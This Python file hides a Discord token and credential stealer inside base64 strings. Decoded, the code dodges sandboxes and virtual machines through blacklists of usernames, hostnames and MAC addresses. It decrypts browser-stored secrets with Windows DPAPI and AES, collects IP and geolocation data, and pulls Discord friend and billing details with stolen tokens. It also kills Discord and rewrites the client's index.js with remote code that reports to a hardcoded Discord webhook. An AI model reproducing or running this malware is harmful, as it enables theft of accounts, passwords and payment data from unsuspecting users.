import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUKZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0CmltcG9ydCByZQpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZAoKZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCwgd2ludHlwZXMsIGJ5cmVmLCBjZGxsLCBTdHJ1Y3R1cmUsIFBPSU5URVIsIGNfY2hhciwgY19idWZmZXIKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3Blbgpmcm9tIGpzb24gaW1wb3J0ICoKaW1wb3J0IHRpbWUKaW1wb3J0IHNodXRpbApmcm9tIHppcGZpbGUgaW1wb3J0IFppcEZpbGUKaW1wb3J0IHJhbmRvbQppbXBvcnQgcmUKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQgc2h1dGlsCmltcG9ydCB1dWlkCmltcG9ydCBzb2NrZXQKaW1wb3J0IGdldHBhc3MKCgoKYmxhY2tsaXN0VXNlcnMgPSBbJ1dEQUdVdGlsaXR5QWNjb3VudCcsICczVzFHSlQnLCAnUVpTQkpWV00nLCAnNUlTWUg5U0gnLCAnQWJieScsICdobWFyYycsICdwYXRleCcsICdSRGhKMENORmV2elgnLCAna0VlY2ZNd2dqJywgJ0ZyYW5rJywgJzhObDBDb2xOUTVicScsICdMaXNhJywgJ0pvaG4nLCAnZ2VvcmdlJywgJ1B4bWRVT3BWeXgnLCAnOFZpelNNJywgJ3cwZmp1T1ZtQ2NQNUEnLCAnbG1Wd2pqOWInLCAnUHFPTmpIVndleHNTJywgJzN1MnY5bTgnLCAnSnVsaWEnLCAnSEVVZVJ6bCcsICdmcmVkJywgJ3NlcnZlcicsICdCdkpDaFJQbnN4bicsICdIYXJyeSBKb2huc29uJywgJ1NxZ0ZPZjNHJywgJ0x1Y2FzJywgJ21pa2UnLCAnUGF0ZVgnLCAnaDdkazF4UHInLCAnTG91aXNlJywgJ1VzZXIwMScsICd0ZXN0JywgJ1JHemNCVXlyem5SZWcnXQoKdXNlcm5hbWUgPSBnZXRwYXNzLmdldHVzZXIoKQoKaWYgdXNlcm5hbWUubG93ZXIoKSBpbiBibGFja2xpc3RVc2VyczoKICAgIG9zLl9leGl0KDApCgpkZWYga29udHJvbCgpOgoKICAgIGJsYWNrbGlzdFVzZXJuYW1lID0gWydCRUU3MzcwQy04QzBDLTQnLCAnREVTS1RPUC1OQUtGRk1UJywgJ1dJTi01RTA3Q09TOUFMUicsICdCMzBGMDI0Mi0xQzZBLTQnLCAnREVTS1RPUC1WUlNRTEFHJywgJ1E5SUFUUktQUkgnLCAnWEM2NFpCJywgJ0RFU0tUT1AtRDAxOUdETScsICdERVNLVE9QLVdJOENMRVQnLCAnU0VSVkVSMScsICdMSVNBLVBDJywgJ0pPSE4tUEMnLCAnREVTS1RPUC1CMFQ5M0Q2JywgJ0RFU0tUT1AtMVBZS1AyOScsICdERVNLVE9QLTFZMjQzM1InLCAnV0lMRVlQQycsICdXT1JLJywgJzZDNEU3MzNGLUMyRDktNCcsICdSQUxQSFMtUEMnLCAnREVTS1RPUC1XRzNNWUpTJywgJ0RFU0tUT1AtN1hDNkdFWicsICdERVNLVE9QLTVPVjlTME8nLCAnUWFyWmhyZEJwaicsICdPUkVMRUVQQycsICdBUkNISUJBTERQQycsICdKVUxJQS1QQycsICdkMWJuSmtmVmxIJywgJ05FVFRZUEMnLCAnREVTS1RPUC1CVUdJTycsICdERVNLVE9QLUNCR1BGRUUnLCAnU0VSVkVSLVBDJywgJ1RJUUlZTEE5VFc1TScsICdERVNLVE9QLUtBTFZJTk8nLCAnQ09NUE5BTUVfNDA0NycsICdERVNLVE9QLTE5T0xMVEQnLCAnREVTS1RPUC1ERTM2OVNFJywgJ0VBOEMyRTJBLUQwMTctNCcsICdBSURBTlBDJywgJ0xVQ0FTLVBDJywgJ01BUkNJLVBDJywgJ0FDRVBDJywgJ01JS0UtUEMnLCAnREVTS1RPUC1JQVBLTjFQJywgJ0RFU0tUT1AtTlRVN1ZVTycsICdMT1VJU0UtUEMnLCAnVDAwOTE3JywgJ3Rlc3Q0MiddCgogICAgaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQoKICAgIGlmIGFueShuYW1lIGluIGhvc3RuYW1lIGZvciBuYW1lIGluIGJsYWNrbGlzdFVzZXJuYW1lKToKICAgICAgICBvcy5fZXhpdCgwKQoKa29udHJvbCgpCgpCTEFDS0xJU1QxID0gWycwMDoxNTo1ZDowMDowNzozNCcsICcwMDplMDo0YzpiODo3YTo1OCcsICcwMDowYzoyOToyYzpjMToyMScsICcwMDoyNTo5MDo2NTozOTplNCcsICdjODo5ZjoxZDpiNjo1ODplNCcsICcwMDoyNTo5MDozNjo2NTowYycsICcwMDoxNTo1ZDowMDowMDpmMycsICcyZTpiODoyNDo0ZDpmNzpkZScsICcwMDoxNTo1ZDoxMzo2ZDowYycsICcwMDo1MDo1NjphMDpkZDowMCcsICcwMDoxNTo1ZDoxMzo2NjpjYScsICc1NjplODo5MjoyZTo3NjowZCcsICdhYzoxZjo2YjpkMDpYTVI6MWI6MjE6MTM6MTU6MjAnLCAnMDA6MTU6NWQ6MDA6MDY6WE1SOjRjOjQ2OmNmOjAxJywgJ1hNUjoxYTpiOScsICdiNjplZDo5ZDoyNzpmNDpmYScsICcwMDoxNTo1ZDowMDowMTo4MScsICc0ZTo3OTpjMDpkOTphZjpjMycsICcwMDoxNTo1ZDpiNjplMDpjYycsICcwMDoxNTo1ZDowMDowMjoyNicsICcwMDo1MDo1NjpiMzowNTpiNCcsICcxYzo5OTo1NzoxYzphZDplNCcsICcwODowMDoyNzozYToyODo3MycsICcwMDoxNTo1ZDowMDowMDpjMycsICcwMDo1MDo1NjphMDpYTVI6MWI6MjE6MTM6MzI6NTEnLCAnYTY6MjQ6YWE6YWU6ZTY6MTInLCAnMDg6MDA6Mjc6NDU6MTM6MTAnLCAnMDA6MWI6MjE6MTM6MjY6WE1SOjVkOjAwOjA1OjhkJywgJzAwOjBjOjI5OjUyOjUyOjUwJywgJzAwOjUwOjU2OmIzOlhNUjoxZjo2YjpkMDo0ZDo5OCcsICcxZTo2YzozNDo5Mzo2ODo2NCcsICcwMDo1MDo1NjphMDo2MTphYScsICdYTVI6YzY6ZmQnLCAnZDQ6ODE6ZDc6ODc6MDU6YWInLCAnYWM6MWY6NmI6ZDA6WE1SOmVjOmVmOjQ0OjAxOmFhJywgJzAwOjE1OjVkOjIzOjRjOmEzJywgJzAwOjFiOjIxOjEzOjMzOjU1JywgJzAwOjE1OjVkOjAwOjAwOmE0JywgJzE2OmVmOjIyOjA0OmFmOjc2JywgJzAwOjE1OjVkOjIzOjRjOmFkJywgJzFhOjZjOjYyOjYwOjNiOmY0JywgJzAwOjE1OjVkOjAwOjAwOjFkJywgJzAwOjUwOjU2OmEwOmNkOmE4JywgJzAwOjUwOjU2OmIzOmZhOjIzJywgJzUyOjU0OjAwOmEwOlhNUjowMzplNDphYjo3Nzo4ZScsICcwMDo1MDo1NjphZTpiMjpiMCcsICcwMDo1MDo1NjpiMzo5NDpjYicsICdYTVI6ZDA6ZmEnLCAnMDA6NTA6NTY6YjM6OTE6YzgnLCAnM2U6YzE6ZmQ6ZjE6YmY6NzEnLCAnMDA6NTA6NTY6YTA6NmQ6ODYnLCAnMDA6NTA6NTY6YTA6YWY6NzUnLCAnMDA6NTA6NTY6YjM6ZGQ6MDMnLCAnYzI6ZWU6YWY6ZmQ6Mjk6MjEnLCAnMDA6NTA6NTY6YjM6ZWU6ZTEnLCAnMDA6NTA6NTY6YTA6ODQ6ODgnLCAnMDA6MWI6MjE6MTM6MzI6MjAnLCAnM2M6ZWM6ZWY6NDQ6MDA6ZDAnLCAnMDA6NTA6NTY6YWU6ZTU6ZDUnLCAnMDA6NTA6NTY6OTc6ZjY6YzgnLCAnNTI6NTQ6MDA6YWI6ZGU6NTknLCAnMDA6NTA6NTY6YjM6OWU6OWUnLCAnMDA6NTA6NTY6YTA6Mzk6MTgnLCAnMzI6MTE6NGQ6ZDA6NGE6OWUnLCAnMDA6NTA6NTY6YjM6ZDA6YTcnLCAnOTQ6ZGU6ODA6ZGU6MWE6MzUnLCAnMDA6NTA6NTY6YWU6NWQ6ZWEnLCAnMDA6NTA6NTY6YjM6MTQ6NTknLCAnZWE6MDI6NzU6M2M6OTA6OWYnLCAnMDA6ZTA6NGM6NDQ6NzY6NTQnLCAnYWM6MWY6NmI6ZDA6NGQ6ZTQnLCAnNTI6NTQ6MDA6M2I6Nzg6MjQnLCAnMDA6NTA6NTY6YjM6NTA6ZGUnLCAnN2U6MDU6YTM6NjI6OWM6NGQnLCAnNTI6NTQ6MDA6YjM6ZTQ6NzEnLCAnOTA6WE1SOjU0JywgJ1hNUjowMToxMycsICcwMDo1MDo1Njo5NzplYzpmMicsICcwMDplMDo0YzpiMzo1YToyYScsICcxMjpmODo4NzphYjoxMzplYycsICcwMDo1MDo1NjphMDozODowNicsICcyZTo2MjplODo0NzoxNDo0OScsICcwMDowZDozYTpkMjo0ZjoxZicsICc2MDowMjo5Mjo2NjoxMDo3OScsICcnLCAnMDA6NTA6NTY6YTA6ZDc6MzgnLCAnYmU6MDA6ZTU6YzU6MGM6ZTUnLCAnMDA6NTA6NTY6YTA6NTk6MTAnLCAnMDA6NTA6NTY6YTA6MDY6OGQnLCAnMDA6ZTA6NGM6Y2I6NjI6MDgnLCAnNGU6ODE6ODE6OGU6MjI6NGUnXQoKbWFjX2FkZHJlc3MgPSB1dWlkLmdldG5vZGUoKQppZiBzdHIodXVpZC5VVUlEKGludD1tYWNfYWRkcmVzcykpIGluIEJMQUNLTElTVDE6CiAgICBvcy5fZXhpdCgwKQoKCgoKd2gwMGsgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5OTQwNjY3NDU1ODcxNzk3Mi9hVmcxd2hGbUtkQnpXVlhsN2ZSZmJ6VjhWbHNGRkRvSVdKaEh1MnN4cmxQZ3g5bWRxTmJoRE9DdklWa0FPOXF4b0JZWSIKaW5qX3VybCA9ICIiCiAgICAKREVURUNURUQgPSBGYWxzZQojYmlyIHVjYWt0aWsgZHVzdHVrIGJpciBnZW1peWRpayBiYXR0aWsgOigKZGVmIGczdDFwKCk6CiAgICBpcCA9ICJOb25lIgogICAgdHJ5OgogICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICByZXR1cm4gaXAKCnJlcXVpcmVtZW50cyA9IFsKICAgIFsicmVxdWVzdHMiLCAicmVxdWVzdHMiXSwKICAgIFsiQ3J5cHRvLkNpcGhlciIsICJweWNyeXB0b2RvbWUiXSwKXQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6CiAgICB0cnk6IF9faW1wb3J0X18obW9kbFswXSkKICAgIGV4Y2VwdDoKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIHttb2RsWzFdfSIsIHNoZWxsPVRydWUpCiAgICAgICAgdGltZS5zbGVlcCgzKQoKaW1wb3J0IHJlcXVlc3RzCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCgpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCnRlbXAgPSBvcy5nZXRlbnYoIlRFTVAiKQpUaHJlYWRsaXN0ID0gW10KCgpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToKICAgIF9maWVsZHNfID0gWwogICAgICAgICgnY2JEYXRhJywgd2ludHlwZXMuRFdPUkQpLAogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQogICAgXQoKZGVmIEczdEQ0dDQoYmxvYl9vdXQpOgogICAgY2JEYXRhID0gaW50KGJsb2Jfb3V0LmNiRGF0YSkKICAgIHBiRGF0YSA9IGJsb2Jfb3V0LnBiRGF0YQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQogICAgY2RsbC5tc3ZjcnQubWVtY3B5KGJ1ZmZlciwgcGJEYXRhLCBjYkRhdGEpCiAgICB3aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKHBiRGF0YSkKICAgIHJldHVybiBidWZmZXIucmF3CgpkZWYgQ3J5cHRVbnByb3RlY3REYXRhKGVuY3J5cHRlZF9ieXRlcywgZW50cm9weT1iJycpOgogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkKICAgIGJ1ZmZlcl9lbnRyb3B5ID0gY19idWZmZXIoZW50cm9weSwgbGVuKGVudHJvcHkpKQogICAgYmxvYl9pbiA9IERBVEFfQkxPQihsZW4oZW5jcnlwdGVkX2J5dGVzKSwgYnVmZmVyX2luKQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpCiAgICBibG9iX291dCA9IERBVEFfQkxPQigpCgogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOgogICAgICAgIHJldHVybiBHM3RENHQ0KGJsb2Jfb3V0KQoKZGVmIEQza3J5cHRWNGxVMyhidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOgogICAgc3RhcnRzID0gYnVmZi5kZWNvZGUoZW5jb2Rpbmc9J3V0ZjgnLCBlcnJvcnM9J2lnbm9yZScpWzozXQogICAgaWYgc3RhcnRzID09ICd2MTAnIG9yIHN0YXJ0cyA9PSAndjExJzoKICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpCiAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCgpkZWYgTDA0ZFIzcXUzc1RzKG1ldGhvZGUsIHVybCwgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOgogICAgZm9yIGkgaW4gcmFuZ2UoOCk6ICMgbWF4IHRyeXMKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIG1ldGhvZGUgPT0gJ1BPU1QnOgogICAgICAgICAgICAgICAgaWYgZGF0YSAhPSAnJzoKICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBvciByLnN0YXR1c19jb2RlID09IDQxMzoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiBMMDRkdXJsMWIod2gwMGssIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgaGVhZGVycyAhPSAnJzoKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3Qod2gwMGssIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KHdoMDBrLCBkYXRhPWRhdGEpKQogICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICBwYXNzCgpkZWYgZ2xvYmFsSW5mbygpOgogICAgaXAgPSBnM3QxcCgpCiAgICB1czNybjRtMSA9IG9zLmdldGVudigiVVNFUk5BTUUiKQogICAgaXBkYXRhbm9qc29uID0gdXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9nZW9sb2NhdGlvbi1kYi5jb20vanNvbnAve2lwfSIpKS5yZWFkKCkuZGVjb2RlKCkucmVwbGFjZSgnY2FsbGJhY2soJywgJycpLnJlcGxhY2UoJ30pJywgJ30nKQogICAgIyBwcmludChpcGRhdGFub2pzb24pCiAgICBpcGRhdGEgPSBsb2FkcyhpcGRhdGFub2pzb24pCiAgICAjIHByaW50KHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZ2VvbG9jYXRpb24tZGIuY29tL2pzb25wL3tpcH0iKSkucmVhZCgpLmRlY29kZSgpKQogICAgY29udHJ5ID0gaXBkYXRhWyJjb3VudHJ5X25hbWUiXQogICAgY29udHJ5Q29kZSA9IGlwZGF0YVsiY291bnRyeV9jb2RlIl0ubG93ZXIoKQogICAgc2VoaXIgPSBpcGRhdGFbInN0YXRlIl0KCiAgICBnbG9iYWxpbmZvID0gZiI6ZmxhZ197Y29udHJ5Q29kZX06ICAtIGB7dXMzcm40bTEudXBwZXIoKX0gfCB7aXB9ICh7Y29udHJ5fSlgIgogICAgcmV0dXJuIGdsb2JhbGluZm8KCgo='
love = 'ZGVmIFRSNnN0KEMwMGsxMyk6CiAgICAjIHNpbXBsZSBUcnVzdCBGYWN0b3Igc3lzdGVtCiAgICBnbG9iYWwgREVURUNURUQKICAgIGRhdGEgPSBzdHIoQzAwazEzKQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgIyBwcmludChsZW4odGltKSkKICAgIGlmIGxlbih0aW0pIDwgLTE6CiAgICAgICAgREVURUNURUQgPSBUcnVlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICBlbHNlOgogICAgICAgIERFVEVDVEVEID0gRmFsc2UKICAgICAgICByZXR1cm4gREVURUNURUQKICAgICAgICAKZGVmIEczdFVIUUZyMTNuZFModDBrM24pOgogICAgYjRkZzNMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0MGszbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIGZyaWVuZGxpc3QgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKICAgIHVocWxpc3QgPSAnJwogICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0OgogICAgICAgIE93bjNkQjNkZzRzID0gJycKICAgICAgICBmbGFncyA9IGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXQogICAgICAgIGZvciBiNGRnMyBpbiBiNGRnM0xpc3Q6CiAgICAgICAgICAgIGlmIGZsYWdzIC8vIGI0ZGczWyJWYWx1ZSJdICE9IDAgYW5kIGZyaWVuZFsndHlwZSddID09IDE6CiAgICAgICAgICAgICAgICBpZiBub3QgIkhvdXNlIiBpbiBiNGRnM1siTmFtZSJdOgogICAgICAgICAgICAgICAgICAgIE93bjNkQjNkZzRzICs9IGI0ZGczWyJFbW9qaSJdCiAgICAgICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYjRkZzNbIlZhbHVlIl0KICAgICAgICBpZiBPd24zZEIzZGc0cyAhPSAnJzoKICAgICAgICAgICAgdWhxbGlzdCArPSBmIntPd24zZEIzZGc0c30gfCB7ZnJpZW5kWyd1c2VyJ11bJ3VzZXJuYW1lJ119I3tmcmllbmRbJ3VzZXInXVsnZGlzY3JpbWluYXRvciddfSAoe2ZyaWVuZFsndXNlciddWydpZCddfSlcbiIKICAgIHJldHVybiB1aHFsaXN0CgoKcHJvY2Vzc19saXN0ID0gb3MucG9wZW4oJ3Rhc2tsaXN0JykucmVhZGxpbmVzKCkKCgpmb3IgcHJvY2VzcyBpbiBwcm9jZXNzX2xpc3Q6CiAgICBpZiAiRGlzY29yZCIgaW4gcHJvY2VzczoKICAgICAgICAKICAgICAgICBwaWQgPSBpbnQocHJvY2Vzcy5zcGxpdCgpWzFdKQogICAgICAgIG9zLnN5c3RlbShmInRhc2traWxsIC9GIC9QSUQge3BpZH0iKQoKZGVmIEczdGIxbGwxbmcodDBrM24pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHQwazNuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB0cnk6CiAgICAgICAgYjFsbDFuZ2pzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKICAgIAogICAgaWYgYjFsbDFuZ2pzb24gPT0gW106IHJldHVybiAiYGBgTm9uZWBgYCIKCiAgICBiMWxsMW5nID0gIiIKICAgIGZvciBtZXRob2RlIGluIGIxbGwxbmdqc29uOgogICAgICAgIGlmIG1ldGhvZGVbImludmFsaWQiXSA9PSBGYWxzZToKICAgICAgICAgICAgaWYgbWV0aG9kZVsidHlwZSJdID09IDE6CiAgICAgICAgICAgICAgICBiMWxsMW5nICs9ICI6Y3JlZGl0X2NhcmQ6IgogICAgICAgICAgICBlbGlmIG1ldGhvZGVbInR5cGUiXSA9PSAyOgogICAgICAgICAgICAgICAgYjFsbDFuZyArPSAiOnBhcmtpbmc6ICIKCiAgICByZXR1cm4gYjFsbDFuZwoKZGVmIGlual9kaXNjb3JkKCk6CgogICAgdXNlcm5hbWUgPSBvcy5nZXRsb2dpbigpCgogICAgZm9sZGVyX2xpc3QgPSBbJ0Rpc2NvcmQnLCAnRGlzY29yZENhbmFyeScsICdEaXNjb3JkUFRCJywgJ0Rpc2NvcmREZXZlbG9wbWVudCddCgogICAgZm9yIGZvbGRlcl9uYW1lIGluIGZvbGRlcl9saXN0OgogICAgICAgIGRlbmVtZV9wYXRoID0gb3MucGF0aC5qb2luKG9zLmdldGVudignTE9DQUxBUFBEQVRBJyksIGZvbGRlcl9uYW1lKQogICAgICAgIGlmIG9zLnBhdGguaXNkaXIoZGVuZW1lX3BhdGgpOgogICAgICAgICAgICBmb3Igc3ViZGlyLCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGRlbmVtZV9wYXRoKToKICAgICAgICAgICAgICAgIGlmICdhcHAtJyBpbiBzdWJkaXI6CiAgICAgICAgICAgICAgICAgICAgZm9yIGRpciBpbiBkaXJzOgogICAgICAgICAgICAgICAgICAgICAgICBpZiAnbW9kdWxlcycgaW4gZGlyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbW9kdWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oc3ViZGlyLCBkaXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3Igc3Vic3ViZGlyLCBzdWJkaXJzLCBzdWJmaWxlcyBpbiBvcy53YWxrKG1vZHVsZV9wYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnZGlzY29yZF9kZXNrdG9wX2NvcmUtJyBpbiBzdWJzdWJkaXI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBzdWJzdWJzdWJkaXIsIHN1YnN1YmRpcnMsIHN1YnN1YmZpbGVzIGluIG9zLndhbGsoc3Vic3ViZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdkaXNjb3JkX2Rlc2t0b3BfY29yZScgaW4gc3Vic3Vic3ViZGlyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIHN1YnN1YmZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlID09ICdpbmRleC5qcyc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oc3Vic3Vic3ViZGlyLCBmaWxlKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlual9jb250ZW50ID0gcmVxdWVzdHMuZ2V0KGlual91cmwpLnRleHQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmpfY29udGVudCA9IGlual9jb250ZW50LnJlcGxhY2UoIiVXRUJIT09LJSIsIHdoMDBrKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgaW5kZXhfZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmRleF9maWxlLndyaXRlKGlual9jb250ZW50KQppbmpfZGlzY29yZCgpCg